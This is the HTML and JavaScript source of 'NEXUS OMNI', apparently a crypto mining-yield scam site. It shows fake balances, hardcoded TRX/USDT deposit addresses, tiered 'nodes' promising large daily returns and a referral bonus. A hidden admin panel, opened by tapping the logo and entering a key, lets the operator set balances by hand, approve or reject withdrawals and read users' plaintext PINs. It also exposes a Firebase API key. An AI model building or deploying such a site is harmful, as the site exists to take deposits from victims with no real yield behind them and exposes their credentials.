<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Prime Yield Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
        :root { --n-blue: #2563eb; --n-dark: #0f172a; --n-emerald: #10b981; }
        body { background: #f8fafc; color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        .glass-card { background: #ffffff; border-radius: 32px; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.04); border: 1px solid rgba(241,245,249,0.8); }
        .input-prime { background: #ffffff !important; color: #0f172a !important; border: 2.5px solid #f1f5f9 !important; border-radius: 22px; padding: 18px; width: 100%; font-weight: 700; outline: none; transition: 0.3s; }
        .input-prime:focus { border-color: var(--n-blue) !important; background: #fff !important; }
        
        .node-card { background: #fff; border-radius: 30px; overflow: hidden; display: flex; height: 150px; box-shadow: 0 10px 30px -5px rgba(0,0,0,0.03); margin-bottom: 20px; border: 1px solid #f1f5f9; position: relative; }
        .tier-tag { position: absolute; top: 12px; right: 12px; padding: 4px 12px; border-radius: 10px; font-size: 8px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; }
        .tier-gold { background: #fef3c7; color: #92400e; }
        .tier-silver { background: #f1f5f9; color: #475569; }
        .tier-bronze { background: #ffedd5; color: #9a3412; }
        
        .node-img { width: 130px; height: 150px; object-fit: cover; }
        .btn-prime { background: var(--n-dark); color: #fff; border-radius: 22px; font-weight: 800; padding: 18px; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; }
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; flex: 1; }
        .nav-link.active { color: var(--n-blue); }
        
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 50000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .chart-container { height: 120px; width: 100%; margin-top: 15px; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-12 h-12 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-4 text-[10px] font-black uppercase tracking-[5px] text-slate-400">Secure Link...</p>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-8">
            <div class="text-center">
                <h1 class="text-5xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-5">
                <input type="text" id="l-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="l-pass" placeholder="PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Verify</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] font-black text-slate-400 uppercase cursor-pointer">Register Account</p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-5 hidden">
                <input type="text" id="s-user" placeholder="Choose ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="Create PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Initialize</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] font-black text-slate-400 uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-44">
        <header class="p-6 sticky top-0 z-50 bg-white/90 backdrop-blur-xl border-b border-slate-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-12 h-12 bg-slate-900 text-white rounded-2xl flex items-center justify-center text-xl font-black">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black text-slate-900 uppercase">---</p>
                    <div id="kyc-badge" class="text-[8px] font-black uppercase px-2 py-0.5 rounded-md bg-amber-100 text-amber-600">Pending KYC</div>
                </div>
            </div>
            <div class="flex gap-2">
                <a href="https://t.me/your_telegram_channel" target="_blank" class="w-10 h-10 rounded-xl bg-blue-50 text-blue-600 flex items-center justify-center text-lg shadow-sm"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="logout()" class="w-10 h-10 rounded-xl bg-slate-50 text-slate-400 flex items-center justify-center"><i class="fa-solid fa-power-off"></i></button>
            </div>
        </header>

        <main id="tab-home" class="p-6 space-y-6">
            <div class="glass-card p-8 bg-slate-900 text-white relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Available Liquidity</p>
                    <h2 id="ui-bal" class="text-4xl font-black mt-2 tracking-tighter">$0.00</h2>
                    
                    <div class="chart-container">
                        <canvas id="hashChart"></canvas>
                    </div>

                    <div class="mt-8 pt-6 border-t border-white/10 flex justify-between">
                        <div><p class="text-[8px] text-slate-500 uppercase">Yield Status</p><p id="ui-prof" class="text-xl font-black text-emerald-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[8px] text-slate-500 uppercase">Phishing Code</p><p id="anti-phish" class="text-[10px] font-black text-blue-400">NX-7782</p></div>
                    </div>
                </div>
            </div>

            <div class="flex gap-3 overflow-x-auto pb-2 no-scrollbar">
                <div class="bg-white px-6 py-4 rounded-3xl min-w-[140px] shadow-sm border border-slate-50">
                    <p class="text-[8px] font-black text-slate-400 uppercase">Bronze Tier</p>
                    <p class="text-[10px] font-black mt-1">1.2x Multiplier</p>
                </div>
                <div class="bg-white px-6 py-4 rounded-3xl min-w-[140px] shadow-sm border border-slate-50">
                    <p class="text-[8px] font-black text-blue-500 uppercase">Silver Tier</p>
                    <p class="text-[10px] font-black mt-1">1.8x Multiplier</p>
                </div>
                <div class="bg-white px-6 py-4 rounded-3xl min-w-[140px] shadow-sm border border-slate-50">
                    <p class="text-[8px] font-black text-amber-500 uppercase">Gold Tier</p>
                    <p class="text-[10px] font-black mt-1">2.5x Multiplier</p>
                </div>
            </div>

            <div class="glass-card p-6 bg-blue-600 text-white flex justify-between items-center">
                <div>
                    <h4 class="text-xs font-black uppercase">Affiliate Program</h4>
                    <p class="text-[9px] font-bold opacity-80 mt-1">Earn 12% on every referral</p>
                </div>
                <button onclick="copyRef()" class="bg-white text-blue-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase">Invite</button>
            </div>

            <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-[4px] ml-1">Mining Infrastructure</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 hidden">
            <h3 class="text-sm font-black uppercase mb-6 text-amber-600"><i class="fa-solid fa-crown mr-2"></i>Gold Sovereign (5)</h3>
            <div id="elite-box" class="space-y-4 mb-10"></div>
            <h3 class="text-sm font-black uppercase mb-6 text-slate-400">Standard Retail (15)</h3>
            <div id="retail-box" class="space-y-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-6 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase text-blue-600">Capital Injection</h3>
                <select id="d-asset" class="input-prime font-bold" onchange="updAddr()">
                    <option value="">Protocol Asset</option>
                    <option value="TRX">TRX (Tron)</option>
                    <option value="USDT">USDT (TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-5">
                    <p id="addr-txt" class="text-[10px] font-mono font-black text-blue-600 p-4 bg-slate-50 rounded-2xl break-all text-center"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Hash ID" class="input-prime">
                    <input type="file" id="d-img" class="text-[10px]">
                    <button onclick="sendD()" class="btn-prime">Submit Audit</button>
                </div>
            </div>
            <div class="glass-card p-8 space-y-5 border-t-8 border-slate-900">
                <h3 class="text-xs font-black uppercase text-slate-400">Institutional Payout</h3>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="w-acc" placeholder="Wallet / Bank Details" class="input-prime">
                <button onclick="sendW()" class="btn-prime !bg-blue-600">Request Payout</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 hidden"><div id="ledger-box" class="space-y-4"></div></main>

        <nav class="fixed bottom-8 left-6 right-6 h-20 glass-card shadow-2xl flex justify-around items-center z-[1000] border border-slate-100">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-grid-2 text-xl mb-1"></i><br>DASH</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-microchip text-xl mb-1"></i><br>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-wallet text-xl mb-1"></i><br>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-receipt text-xl mb-1"></i><br>HISTORY</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b pb-4">
            <h2 class="font-black uppercase text-blue-600">Terminal Core</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-3xl">&times;</button>
        </div>
        <div id="adm-users" class="space-y-4 mb-10"></div>
        <div id="adm-reqs" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        // 15+5 Nodes with Tiers
        const nodeData = {
            elite: Array.from({length: 5}, (_, i) => ({ id: `e${i}`, name: `Sovereign Elite G${i+1}`, price: 5000 + (i*5000), daily: 750 + (i*800), tier: 'gold', img: `https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400&sig=e${i}` })),
            retail: Array.from({length: 15}, (_, i) => ({ id: `r${i}`, name: `Nexus Node v${i+1}`, price: 100 + (i*200), daily: 12 + (i*18), tier: i > 7 ? 'silver' : 'bronze', img: `https://images.unsplash.com/photo-1518770660439-4636190af475?w=300&sig=r${i}` }))
        };

        window.onload = () => {
            renderNodes();
            initChart();
            setTimeout(() => document.getElementById('preloader').style.display='none', 800);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        function initChart() {
            const ctx = document.getElementById('hashChart').getContext('2d');
            new Chart(ctx, {
                type: 'line',
                data: { labels: ['', '', '', '', '', '', ''], datasets: [{ data: [30, 45, 35, 55, 40, 65, 50], borderColor: '#3b82f6', tension: 0.4, borderWidth: 3, pointRadius: 0, fill: true, backgroundColor: 'rgba(59, 130, 246, 0.1)' }]},
                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false }}, scales: { x: { display: false }, y: { display: false }}}
            });
        }

        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Access Denied.");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { 
                const phish = "NX-" + Math.floor(1000 + Math.random() * 9000);
                await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, banned: false, kyc: 'Pending', phishCode: phish }); 
                toggleAuth(false); 
            }
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                if(d.banned) { logout(); return; }
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                document.getElementById('anti-phish').innerText = d.phishCode || 'NX-4421';
                const badge = document.getElementById('kyc-badge');
                badge.innerText = d.kyc === 'Verified' ? 'Verified Account' : 'Pending KYC';
                badge.className = `text-[8px] font-black uppercase px-2 py-0.5 rounded-md ${d.kyc === 'Verified' ? 'bg-emerald-100 text-emerald-600' : 'bg-amber-100 text-amber-600'}`;
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-8 border-blue-600">
                        <div><p class="text-[10px] font-black uppercase">${v.name}</p><p class="text-[8px] font-bold text-slate-400 mt-1">Mining Active...</p></div>
                        <i class="fa-solid fa-circle-notch fa-spin text-blue-600"></i>
                    </div>`).join('') || '<p class="text-center py-10 text-slate-300 font-black uppercase text-[9px]">No protocols online</p>';
                
                const hist = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('ledger-box').innerHTML = hist.map(([k, h]) => `
                    <div class="bg-white p-5 rounded-3xl flex justify-between items-center shadow-sm">
                        <div><p class="text-[10px] font-black uppercase">${h.type}</p><p class="text-[8px] font-bold text-slate-400">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black">$${h.amount}</p><p class="text-[8px] font-black uppercase ${h.status === 'Cleared' ? 'text-emerald-500' : 'text-amber-500'}">${h.status}</p></div>
                    </div>`).join('');
            });
        }

        window.renderNodes = () => {
            const ui = (n) => `
                <div class="node-card">
                    <span class="tier-tag tier-${n.tier}">${n.tier}</span>
                    <img src="${n.img}" class="node-img">
                    <div class="node-info">
                        <h4 class="text-[11px] font-black uppercase text-slate-800">${n.name}</h4>
                        <p class="text-[10px] font-bold text-emerald-600 mt-1">Yield: $${n.daily}/day</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-xl font-black text-slate-900">$${n.price}</span>
                            <button onclick="buyNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        };

        window.buyNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr'), s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < price) return alert("Insufficient Liquidity.");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${uid}/nodes`), { name, deployedAt: Date.now() });
            alert("Deployment Successful!"); nav('home');
        };

        // Admin Secret
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; }
        };

        function runAdm() {
            onValue(ref(db, 'users'), (s) => {
                const u = s.val();
                document.getElementById('adm-users').innerHTML = u ? Object.entries(u).map(([id, d]) => `
                    <div class="bg-slate-50 p-5 rounded-2xl space-y-3">
                        <p class="font-black text-[10px] uppercase">${id} (PIN: ${d.password})</p>
                        <div class="flex gap-2">
                            <button onclick="modBal('${id}','add')" class="bg-emerald-600 text-white text-[7px] font-black px-3 py-2 rounded-lg">ADD $</button>
                            <button onclick="verifyKYC('${id}')" class="bg-blue-600 text-white text-[7px] font-black px-3 py-2 rounded-lg">VERIFY KYC</button>
                            <button onclick="toggleBan('${id}', ${d.banned})" class="bg-black text-white text-[7px] font-black px-3 py-2 rounded-lg">BAN</button>
                        </div>
                    </div>`).join('') : '';
            });
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('adm-reqs').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-5 border space-y-3">
                        <p class="text-[9px] font-black uppercase">${r.type} | ${r.user} | $${r.amount}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-32 object-cover rounded-xl">` : ''}
                        <div class="flex gap-2">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared','${r.type}')" class="bg-emerald-600 text-white py-3 rounded-xl flex-1 font-black text-[8px]">APPROVE</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined','${r.type}')" class="bg-rose-600 text-white py-3 rounded-xl flex-1 font-black text-[8px]">REJECT</button>
                        </div>
                    </div>`).join('') : '';
            });
        }

        window.verifyKYC = async (uid) => await update(ref(db, `users/${uid}`), { kyc: 'Verified' });
        window.copyRef = () => { navigator.clipboard.writeText(`https://nexus-omni.io/join?ref=${localStorage.getItem('nx_usr')}`); alert("Referral Link Copied!"); };
        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value, map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.sendD = () => { const f = document.getElementById('d-img').files[0]; if(!f) return; const reader = new FileReader(); reader.readAsDataURL(f); reader.onload = async () => { const uid = localStorage.getItem('nx_usr'), key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: document.getElementById('d-amt').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Audit Started"); nav('ledger'); }; };
        window.sendW = async () => { const uid = localStorage.getItem('nx_usr'), amt = parseFloat(document.getElementById('w-amt').value), acc = document.getElementById('w-acc').value; if(!amt || !acc) return; const s = await get(ref(db, `users/${uid}`)); if(s.val().balance < amt) return alert("Insufficient Liquidity"); await update(ref(db, `users/${uid}`), { balance: s.val().balance - amt }); const key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: amt, accDetails: acc, status: 'Pending', type: 'Withdrawal', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Withdrawal Requested"); nav('ledger'); };
        window.modBal = async (uid, type) => { const val = prompt("Amount:"); if(!val) return; const s = await get(ref(db, `users/${uid}`)); const cur = s.val().balance || 0; await update(ref(db, `users/${uid}`), { balance: type === 'add' ? cur + parseFloat(val) : cur - parseFloat(val) }); };
        window.toggleBan = async (uid, cur) => await update(ref(db, `users/${uid}`), { banned: !cur });
        window.audit = async (id, user, amt, status, type) => {
            if(status === 'Cleared' && type === 'Deposit') { const s = await get(ref(db, `users/${user}`)); await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) }); }
            if(status === 'Declined' && type === 'Withdrawal') { const s = await get(ref(db, `users/${user}`)); await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) }); }
            await update(ref(db, `users/${user}/history/${id}`), { status }); await remove(ref(db, 'admin/requests/' + id));
        };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
